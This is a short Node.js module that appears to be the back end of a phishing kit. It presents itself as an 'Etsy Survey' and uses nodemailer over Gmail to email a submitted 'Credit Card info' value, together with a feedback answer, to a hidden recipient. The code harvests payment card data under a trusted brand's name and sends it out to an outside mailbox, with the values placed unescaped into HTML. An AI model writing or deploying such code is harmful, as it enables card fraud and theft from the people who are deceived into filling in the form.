'use strict';

const nodemailer = require('nodemailer');
const path = require('path');
const ABSPATH = path.dirname(process.mainModule.filename); // Absolute path to our app directory
const transporter = nodemailer.createTransport({ // Use an app specific password here
  service: 'Gmail',
  auth: {
    user: '',
    pass: ''
  }
});

exports.sendMailService=function(cardC='not exit',opinion='no Feedback',image='no file'){
	const options = {
    from: '',
    to: '',
    subject: 'From Etsy Survey',
    html: `<ul>
     <li><br>Credit Card info:<b> ${cardC}</li>
    <li>If there one thing that could change about Etsy involvement, what you would be?<br>answer:<span>${opinion}</span></li> 

     </ul>`
    // attachments: [
      // {
       //  path: ABSPATH + '/images/test.jpg'
      //}
   // ]
};
transporter.sendMail(options, (error, info) =>{
    if(error) {
       console.log('error')
    } else {
      console.log('hi')
    }
});

};

//module.exports=sendMailService












